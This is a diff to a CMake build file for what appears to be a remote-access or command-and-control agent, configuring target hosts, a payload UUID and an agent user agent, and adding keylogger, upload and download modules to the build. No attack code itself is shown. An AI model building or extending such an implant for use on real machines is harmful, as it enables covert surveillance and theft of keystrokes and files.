@@ -16,6 +16,7 @@ set(INPUT_HOSTS "localhost" CACHE STRING "List of target host addresses")
 string(STRIP "${INPUT_HOSTS}" INPUT_HOSTS)
 string(REPLACE ";" "\", L\"" HOSTS_INITIALIZER \"${INPUT_HOSTS}\")
 set(WIDE_HOSTS_LIST "L${HOSTS_INITIALIZER}")
+set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
 
 # Payload UUID Configuration
 set(INPUT_PAYLOAD_UUID "e8ebbf8c-dbfb-41ab-8699-9ac18afded4a" CACHE STRING "The payload unique identifier")
@@ -28,7 +29,7 @@ string(STRIP "${PORT}" CLEAN_PORT)
 set(INPUT_USER_AGENT "Trinity Agent Client/1.0" CACHE STRING "The user agent for requests")
 
 # Agent Header Configuration
-set(INPUT_REQUEST_HEADER "Content-Type: application/json\r\n" CACHE STRING "The agent request header")
+set(INPUT_REQUEST_HEADER "Content-Type: application/json" CACHE STRING "The agent request header")
 
 # Add source to this project's executable.
 add_executable (
@@ -46,6 +47,12 @@ add_executable (
   "include/Task.h"
   "include/Command.h"
   "include/mscorlib.h"
+  "include/Keylogger.h"
+  "src/Keylogger.cpp"
+  "include/Upload.h"
+  "src/Upload.cpp"
+  "include/Download.h"
+  "src/Download.cpp"
 )
 
 target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
